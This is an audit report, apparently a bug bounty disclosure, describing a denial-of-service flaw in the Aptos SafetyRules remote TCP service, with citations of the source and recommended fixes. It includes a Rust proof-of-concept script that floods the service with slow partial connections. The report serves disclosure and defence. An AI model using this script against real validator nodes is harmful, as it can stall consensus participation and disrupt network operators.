# Audit Report

## Title
SafetyRules Remote Service Lacks Connection Limits Enabling Denial of Service

## Summary
The SafetyRules remote service (`remote_service::execute()`) does not implement connection limits or concurrent connection handling. An attacker can open multiple slow or malicious TCP connections, preventing legitimate validators from accessing the SafetyRules service and causing consensus liveness failures.

## Finding Description

The SafetyRules component is critical for consensus safety—it prevents validators from equivocating (double-signing) and ensures voting rule compliance. When configured in `Process` or `Thread` mode, SafetyRules runs as a remote service accessible via TCP.

The vulnerability exists in the network handling implementation:

**1. Single Connection Architecture:**
The `NetworkServer` struct maintains only one active client connection at a time: [1](#0-0) 

**2. Sequential Message Processing:**
The `execute()` function processes messages in a blocking sequential loop: [2](#0-1) 

**3. Connection Acceptance Pattern:**
The `client()` method only accepts a new connection when no active stream exists: [3](#0-2) 

**Attack Scenario:**

1. Attacker opens a TCP connection to the SafetyRules service (default: localhost:5555)
2. Attacker sends partial message data or data very slowly
3. The server waits with timeout (default 30 seconds, min 5 seconds)
4. During this waiting period, **no other connections can be accepted**
5. The legitimate validator trying to connect is blocked in the TCP backlog queue
6. Attacker repeats with multiple connections, exhausting the TCP backlog (~128 connections)
7. Legitimate validator connections are rejected, preventing consensus participation

**No Authentication:**
The `NetworkServer` implementation performs **no authentication or authorization checks**: [4](#0-3) 

The service binds to a `SocketAddr` without any cryptographic handshake, peer verification, or access control.

## Impact Explanation

**Severity: HIGH** (per Aptos bug bounty: "Validator node slowdowns")

**Consensus Impact:**
- SafetyRules is **critical** for preventing equivocation and ensuring consensus safety
- If a validator cannot access SafetyRules, it cannot vote on proposals or sign blocks
- This causes the validator to effectively stop participating in consensus
- Multiple affected validators reduce network liveness

**Resource Exhaustion:**
- Single connection bottleneck means service capacity is 1 request per timeout period
- With 30-second timeouts, maximum throughput is ~2 requests/minute
- Normal consensus requires multiple SafetyRules operations per second

**Scope:**
While the mainnet config sanitizer enforces `Local` mode for SafetyRules: [5](#0-4) 

The vulnerability still affects:
- Testnet/devnet validators where `Process` mode is commonly used
- Misconfigured mainnet nodes (operator error)
- Internal testing and development environments
- The sanitizer is a **policy check**, not a security boundary—configuration can be overridden

**Local vs. Remote Exposure:**
Example configuration binds to localhost: [6](#0-5) 

However, even localhost binding is vulnerable to:
- Co-located processes on the same machine
- Compromised containers in the same pod/namespace
- Lateral movement after initial compromise

## Likelihood Explanation

**Likelihood: HIGH** for affected deployments

**Ease of Exploitation:**
- No authentication required—any TCP client can connect
- Trivial to implement: open multiple connections, send slow/partial data
- No specialized knowledge or tools needed
- Can be executed remotely if not bound to localhost

**Attacker Requirements:**
- Network access to SafetyRules service port (localhost or exposed)
- Ability to open TCP connections
- No cryptographic material or insider access needed

**Deployment Frequency:**
- Testnet/devnet validators commonly use `Process` or `Thread` mode
- Development and testing environments use remote SafetyRules
- Configuration errors in production are possible

## Recommendation

**Immediate Mitigations:**

1. **Enforce Localhost Binding:**
   Add validation to reject non-localhost addresses in `RemoteService` configuration

2. **Add Connection Limits:**
   Implement maximum concurrent connection limits in `NetworkServer`:
   ```rust
   pub struct NetworkServer {
       service: String,
       listener: Option<TcpListener>,
       active_connections: Arc<Mutex<HashMap<SocketAddr, NetworkStream>>>,
       max_connections: usize, // e.g., 10
       timeout_ms: u64,
   }
   ```

3. **Implement Connection Pooling:**
   Handle multiple connections concurrently using async or thread-per-connection model

4. **Add Authentication:**
   Integrate Noise protocol handshake similar to the main network transport: [7](#0-6) 

5. **Add Rate Limiting:**
   Limit requests per source IP/connection to prevent abuse

**Recommended Fix:**

Replace the sequential loop with async concurrent handling:
```rust
pub async fn execute_concurrent(
    storage: PersistentSafetyStorage,
    listen_addr: SocketAddr,
    network_timeout_ms: u64,
    max_connections: usize,
) {
    let safety_rules = Arc::new(Mutex::new(SafetyRules::new(storage, false)));
    let listener = TcpListener::bind(listen_addr).await.unwrap();
    let semaphore = Arc::new(Semaphore::new(max_connections));
    
    loop {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let (stream, addr) = listener.accept().await.unwrap();
        let safety_rules = safety_rules.clone();
        
        tokio::spawn(async move {
            handle_connection(stream, addr, safety_rules, network_timeout_ms).await;
            drop(permit);
        });
    }
}
```

## Proof of Concept

**Rust DoS Test:**

```rust
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn dos_attack() {
    let target = "127.0.0.1:5555";
    let num_connections = 200;
    
    // Open many connections
    let handles: Vec<_> = (0..num_connections)
        .map(|i| {
            thread::spawn(move || {
                if let Ok(mut stream) = TcpStream::connect(target) {
                    println!("Connection {} established", i);
                    // Send partial data and sleep
                    let _ = stream.write(&[0x00, 0x00, 0x00]);
                    thread::sleep(Duration::from_secs(60));
                }
            })
        })
        .collect();
    
    // Legitimate client tries to connect
    thread::sleep(Duration::from_secs(1));
    match TcpStream::connect(target) {
        Ok(_) => println!("Legitimate client connected"),
        Err(e) => println!("Legitimate client BLOCKED: {}", e),
    }
    
    for handle in handles {
        handle.join().unwrap();
    }
}
```

**Expected Result:**
- First ~128 malicious connections succeed (TCP backlog)
- Subsequent connections timeout or are refused
- Legitimate validator cannot access SafetyRules
- Validator stops participating in consensus

**Test demonstrates:**
The existing timeout test shows the sequential behavior: [8](#0-7) 

## Notes

This is an **application-level design flaw** in the SafetyRules remote service architecture, not a network infrastructure DoS. The vulnerability stems from:
1. Missing connection limits
2. Single-connection-at-a-time architecture  
3. No authentication/authorization
4. Sequential blocking message processing

While the mainnet config sanitizer discourages `Process` mode, the code exists, can be enabled, and introduces risk in testnet/devnet environments where validators actively participate in consensus. The criticality of SafetyRules for consensus safety makes even partial service disruption a high-severity concern.

### Citations

**File:** secure/net/src/lib.rs (L272-278)
```rust
pub struct NetworkServer {
    service: String,
    listener: Option<TcpListener>,
    stream: Option<NetworkStream>,
    /// Read, Write, Connect timeout in milliseconds.
    timeout_ms: u64,
}
```

**File:** secure/net/src/lib.rs (L365-404)
```rust
    fn client(&mut self) -> Result<&mut NetworkStream, Error> {
        if self.stream.is_none() {
            self.increment_counter(Method::Connect, MethodResult::Query);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionAttempt,
            ));

            let listener = self.listener.as_mut().ok_or(Error::AlreadyShutdown)?;

            let (stream, stream_addr) = match listener.accept() {
                Ok(ok) => ok,
                Err(err) => {
                    self.increment_counter(Method::Connect, MethodResult::Failure);
                    let err = err.into();
                    warn!(SecureNetLogSchema::new(
                        &self.service,
                        NetworkMode::Server,
                        LogEvent::ConnectionSuccessful,
                    )
                    .error(&err));
                    return Err(err);
                },
            };

            self.increment_counter(Method::Connect, MethodResult::Success);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionSuccessful,
            )
            .remote_peer(&stream_addr));

            stream.set_nodelay(true)?;
            self.stream = Some(NetworkStream::new(stream, stream_addr, self.timeout_ms));
        }

        self.stream.as_mut().ok_or(Error::NoActiveStream)
    }
```

**File:** secure/net/src/lib.rs (L606-628)
```rust
    fn test_server_timeout() {
        let server_port = utils::get_available_port();
        let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
        let mut server = NetworkServer::new("test".to_string(), server_addr, TIMEOUT);
        let mut client = NetworkClient::new("test".to_string(), server_addr, TIMEOUT);
        let data1 = vec![0, 1, 2, 3];
        let data2 = vec![4, 5, 6, 7];

        // First client, success
        client.write(&data1).unwrap();
        let result1 = server.read().unwrap();
        assert_eq!(data1, result1);

        // Timedout
        server.read().unwrap_err();

        // New client, success, note the previous client connection is still active, the server is
        // actively letting it go due to lack of activity.
        let mut client2 = NetworkClient::new("test".to_string(), server_addr, TIMEOUT);
        client2.write(&data2).unwrap();
        let result2 = server.read().unwrap();
        assert_eq!(data2, result2);
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-45)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** config/src/config/test_data/validator.yaml (L13-16)
```yaml
    safety_rules:
        service:
            type: process
            server_address: "/ip4/127.0.0.1/tcp/5555"
```

**File:** network/framework/src/noise/handshake.rs (L1-10)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

//! The handshake module implements the handshake part of the protocol.
//! This module also implements additional anti-DoS mitigation,
//! by including a timestamp in each handshake initialization message.
//! Refer to the module's documentation for more information.
//! A successful handshake returns a [`NoiseStream`] which is defined in the
//! [stream] module.
//!
```
